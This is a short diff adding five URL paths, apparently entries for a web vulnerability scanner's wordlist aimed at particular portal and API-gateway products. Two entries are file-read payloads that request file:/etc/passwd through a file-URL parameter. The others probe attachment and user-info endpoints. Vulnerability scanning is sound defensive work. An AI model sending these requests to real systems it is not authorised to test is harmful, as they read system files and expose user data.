@@ -1,0 +1,5 @@
+/portal/attachment_clearTempFile.action?bean.RecId=1
+/portal/attachment_getAttList.action?bean.RecId=1
+/evo-apigw/evo-cirs/file/readPic?fileUrl=file:/etc/passwd
+/admin/user_getUserInfoByUserName.action?userName=system
+/portal/itc/attachment_downloadByUrlAtt.action?filePath=file:/etc/passwd
